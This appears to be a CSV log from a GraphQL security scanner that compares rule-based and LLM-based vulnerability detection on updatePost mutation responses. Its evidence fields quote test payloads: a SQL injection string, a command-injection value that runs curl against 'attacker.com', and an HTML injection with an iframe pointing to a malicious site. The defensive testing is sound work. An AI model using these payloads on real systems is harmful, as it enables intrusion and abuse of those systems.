timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-05T15:25:58.381285,updatePost_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a SQL injection payload pattern ('OR 1=1;--) in the title field. This specific pattern is commonly used to manipulate SQL queries by forcing true conditions and commenting out subsequent query logic. While no direct SQL errors are shown, the presence of this payload in a GraphQL mutation response suggests potential improper input sanitization where user-controlled values might be directly interpolated into SQL queries."", ""evidence"": ""Title field contains 'Hacked' OR 1=1;-- "", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.8, ""evidence"": ""Title field contains 'Hacked' OR 1=1;-- "", ""explanation"": ""The response contains a SQL injection payload pattern ('OR 1=1;--) in the title field. This specific pattern is commonly used to manipulate SQL queries by forcing true conditions and commenting out subsequent query logic. While no direct SQL errors are shown, the presence of this payload in a GraphQL mutation response suggests potential improper input sanitization where user-controlled values might be directly interpolated into SQL queries.""}}]"
2025-10-05T15:26:04.086434,updatePost_response_3,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:26:10.894661,updatePost_response_4,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:26:19.310278,updatePost_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a semicolon (;) followed by a curl command to an external domain in the title field. Semicolons are command separators in Unix-like systems, and this pattern suggests potential command injection if the input is passed to a system shell without proper sanitization. The curl command targeting 'attacker.com' indicates an attempt to execute arbitrary OS commands or initiate external network requests."", ""evidence"": ""title: 'Test; curl https://attacker.com'"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.85, ""evidence"": ""title: 'Test; curl https://attacker.com'"", ""explanation"": ""The response contains a semicolon (;) followed by a curl command to an external domain in the title field. Semicolons are command separators in Unix-like systems, and this pattern suggests potential command injection if the input is passed to a system shell without proper sanitization. The curl command targeting 'attacker.com' indicates an attempt to execute arbitrary OS commands or initiate external network requests.""}}]"
2025-10-05T15:26:24.882695,updatePost_response_6,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:26:36.746795,updatePost_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized HTML content in the 'body' field, including an <h1> tag and a malicious <iframe>. This indicates the application does not properly sanitize user-controlled input, allowing attackers to inject arbitrary HTML markup. If this field is rendered in a client/browser without proper escaping, it could lead to UI manipulation, phishing (via the iframe), or other client-side attacks."", ""evidence"": ""<h1>Unauthorized Access</h1><iframe src='malicious.site'>"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""<h1>Unauthorized Access</h1><iframe src='malicious.site'>"", ""explanation"": ""The response contains unsanitized HTML content in the 'body' field, including an <h1> tag and a malicious <iframe>. This indicates the application does not properly sanitize user-controlled input, allowing attackers to inject arbitrary HTML markup. If this field is rendered in a client/browser without proper escaping, it could lead to UI manipulation, phishing (via the iframe), or other client-side attacks.""}}]"
2025-10-05T15:26:45.313233,updatePost_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:27:04.458209,updatePost_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:27:11.153663,updatePost_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:27:33.622682,updatePost_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Injection Attacks,1,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: information_disclosure/field_suggestions"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL server responds with detailed field suggestions when invalid fields are requested (e.g., 'tit1e' \u2192 'title', 'b0dy' \u2192 'body'). This behavior exposes valid schema field names, enabling attackers to enumerate and map the API structure. While not directly exploitable, this information disclosure reduces the attacker's guessing effort and could reveal hidden functionality in more sensitive implementations."", ""evidence"": ""Multiple 'Did you mean' suggestions in error messages (e.g., 'title', 'body')"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""information_disclosure/field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.95, ""evidence"": ""Multiple 'Did you mean' suggestions in error messages (e.g., 'title', 'body')"", ""explanation"": ""The GraphQL server responds with detailed field suggestions when invalid fields are requested (e.g., 'tit1e' \u2192 'title', 'b0dy' \u2192 'body'). This behavior exposes valid schema field names, enabling attackers to enumerate and map the API structure. While not directly exploitable, this information disclosure reduces the attacker's guessing effort and could reveal hidden functionality in more sensitive implementations.""}}]"
